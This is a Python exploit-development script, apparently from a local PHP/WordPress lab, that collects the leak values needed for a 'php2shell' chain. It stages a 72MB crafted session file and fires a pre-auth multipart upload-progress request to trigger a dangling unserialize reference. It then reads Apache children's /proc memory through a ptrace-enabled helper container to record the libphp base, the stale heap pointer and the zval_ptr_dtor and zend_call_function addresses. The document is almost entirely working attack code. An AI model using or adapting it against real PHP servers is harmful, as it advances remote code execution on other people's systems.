#!/usr/bin/env python3
"""a2_leak_collect.py - ASSISTED tier: record the four leak values the
vendor's php2shell leaks in-band (main heap, stale reference, and the
zval_ptr_dtor / zend_call_function runtime addresses) from OUR lane,
using lab access (in-container root /proc reads).

This is the A2-assisted version of the vendor's LEAKED block:
  producer fire (pure stock INIs, pre-auth) -> the surviving child keeps
  BG(unserialize) = {level: 1, data: dangling} in basic_globals ->
  we read those globals via /proc/<child>/mem, plus the libphp bias from
  the child's maps. Recorded as evidence; the UNAUTHENTICATED version of
  the same four values is milestone A3 (in-band bogus-length oracle).
"""
import json
import os
import re
import subprocess
import sys
import time
import uuid
from datetime import datetime, timezone

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from wpfire import http_exchange  # noqa: E402

REPO = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
SERVICE = "wordpress-x86"
HOST, PORT = "127.0.0.1", 8099
SYMS = {"zend_call_function": 0x47A710, "zval_ptr_dtor": 0x487650}
BG_UNSER = 0xF4C020          # basic_globals (our lane binary)
OFF_DATA, OFF_LEVEL = 0x350, 0x358

def sh(args, timeout=20):
    r = subprocess.run(args, capture_output=True, text=True, timeout=timeout, cwd=REPO)
    return r.returncode, r.stdout.strip()

def cexec(cmd, timeout=20):
    return sh(["docker", "compose", "exec", "-T", "-u", "root", SERVICE,
               "sh", "-c", cmd], timeout)

def helper_scan():
    """One privileged helper container joins the lane PID namespace and
    scans EVERY apache child: libphp bias + BG(unserialize).level/.data.
    (The lane container's own root lacks CAP_SYS_PTRACE - Yama forbids
    sibling ptrace - so reads must come from a cap-add helper.)"""
    cname = "php-firing-range-wordpress-x86-1"
    script = (
        'for P in $(ps -eo pid,comm | grep -w apache2 | awk "{print \$1}"); do '
        'B=$(grep libphp /proc/$P/maps 2>/dev/null | head -1 | cut -d- -f1); '
        '[ -z "$B" ] && continue; '
        'BB=$((16#$B)); '
        'D=$(dd if=/proc/$P/mem bs=1 skip=$((BB+0xf4c020+0x350)) count=8 2>/dev/null | od -An -tx1 | tr -d " \n"); '
        'L=$(dd if=/proc/$P/mem bs=1 skip=$((BB+0xf4c020+0x358)) count=4 2>/dev/null | od -An -tx1 | tr -d " \n"); '
        'echo "$P $B $L $D"; done')
    r = subprocess.run(
        ["docker", "run", "--rm", "--cap-add", "SYS_PTRACE",
         f"--pid=container:{cname}", "php:8.2-apache", "bash", "-c", script],
        capture_output=True, text=True, timeout=60, cwd=REPO)

    def le(hexstr):
        """od -tx1 prints memory-order bytes; qword value is LE."""
        try:
            return int.from_bytes(bytes.fromhex(hexstr), "little")
        except ValueError:
            return 0

    out = []
    for line in r.stdout.splitlines():
        f = line.split()
        if len(f) != 4:
            continue
        pid, bias, lvl_hex, data_hex = f
        out.append({"pid": pid, "bias": int(bias, 16),
                    "level": le(lvl_hex), "data": le(data_hex)})
    return out

def read_child_qword(pid, addr, n=8):
    rc, out = cexec(f"dd if=/proc/{pid}/mem bs=1 skip={addr} count={n} "
                    f"2>/dev/null | od -An -tx1")
    if rc != 0 or not out:
        return None
    try:
        return int(out.replace(" ", ""), 16)
    except ValueError:
        return None

def child_libphp_bias(pid):
    rc, maps = cexec(f"cat /proc/{pid}/maps")
    if rc != 0:
        return None
    for line in maps.splitlines():
        if "libphp.so" in line and line.split()[2] == "00000000":
            return int(line.split("-")[0], 16)
    return None

def stage_session_file(sid, mb=72):
    rc, _ = cexec(
        f"F=/tmp/sess_{sid}; rm -f $F; "
        f"printf 'poc|a:2:{{i:0;s:3:\"abc\";i:1;s:{mb*1024*1024}:\"' > $F; "
        f"head -c {mb*1024*1024} /dev/zero | tr '\\0' 'A' >> $F; "
        f"printf '\";}}' >> $F; chown www-data:www-data $F; chmod 600 $F; "
        f"wc -c < $F")
    return rc == 0

def main():
    sid = "wp2leak" + uuid.uuid4().hex[:24]
    print(f"[*] staging 72MB session file for sid={sid}")
    assert stage_session_file(sid), "staging failed"
    body = (b"--WPFIRE\r\n" +
            b'Content-Disposition: form-data; name="PHPSESSID"\r\n\r\n' +
            sid.encode() + b"\r\n" +
            b"--WPFIRE\r\n" +
            b'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\npoc\r\n' +
            b"--WPFIRE\r\n" +
            b'Content-Disposition: form-data; name="u"; filename="a.txt"\r\n'
            b"Content-Type: text/plain\r\n\r\nx\r\n" +
            b"--WPFIRE--\r\n")
    req = ((f"POST / HTTP/1.1\r\nHost: {HOST}:{PORT}\r\n"
           f"Content-Type: multipart/form-data; boundary=WPFIRE\r\n"
           f"Content-Length: {len(body)}\r\nConnection: close\r\n\r\n"
           ).encode() + body)
    resp = http_exchange(HOST, PORT, req, timeout=30)
    fatal = re.search(rb"tried to allocate (\d+)",
                      resp.raw.partition(b"\r\n\r\n")[2])
    print(f"[*] producer: {resp.summary()} "
          f"fatal_alloc={fatal.group(1).decode() if fatal else None}")

    rc, out = cexec("ps -eo pid,comm | grep -w apache2 | awk '{print $1}'")
    print(f"[*] helper-scan of apache children (pid, bias, level, data) ...")
    kids = helper_scan()
    print(f"[*] {len(kids)} children scanned")
    hit = next((k for k in kids if k["level"] not in (0, None)), None)
    if not hit:
        print("[-] no child with stale level found (children recycled?)")
        for k in kids:
            print(f"    child {k['pid']}: level={k['level']} data={k['data']:#x}")
        return 1
    print(f"[+] child {hit['pid']}: libphp bias 0x{hit['bias']:x}  "
          f"BG(unserialize).level = {hit['level']}  data = {hit['data']:#x}")
    data = hit["data"]
    hit_bias = hit["bias"]
    rec = {
        "tier": "ASSISTED (lab /proc reads; unauthenticated = A3)",
        "ts": datetime.now(timezone.utc).isoformat(),
        "service": SERVICE, "sid": sid, "child_pid": hit["pid"],
        "libphp_bias": hit_bias,
        "stale_chunk_base": data & ~0x1FFFFF if data else None,
        "stale_reference": data,
        "zval_ptr_dtor": hit_bias + SYMS["zval_ptr_dtor"],
        "zend_call_function": hit_bias + SYMS["zend_call_function"],
        "note": "stale_reference = BG(unserialize).data read straight from "
                "basic_globals of the child that fired the producer; "
                "stale_chunk_base = the dedicated 2MB region of the freed "
                "8216B d-chunk (emalloc_large -> dedicated chunk, NOT the "
                "main heap where sprays land; the vendor's main_heap has "
                "their stale ref INSIDE it - different allocation class on "
                "php 8.5); code addrs = bias + nm offsets of this lane's "
                "libphp (derive, never hardcode).",
    }
    os.makedirs("results/wp-lastmile/a2", exist_ok=True)
    p = f"results/wp-lastmile/a2/leak_{datetime.now(timezone.utc).strftime('%Y%m%dT%H%M%S')}.json"
    with open(p, "w") as f:
        json.dump(rec, f, indent=1)
    print("\n===== OUR LEAKED BLOCK (assisted tier) =====")
    for k in ("stale_chunk_base", "stale_reference", "zval_ptr_dtor",
              "zend_call_function"):
        v = rec[k]
        print(f"  {k:<19}:: 0x{v:x}" if v else f"  {k:<19}:: <read failed>")
    print(f"  (natural_tables calibration: pending groom-placement scan)")
    print(f"[*] evidence: {p}")
    return 0

if __name__ == "__main__":
    sys.exit(main())
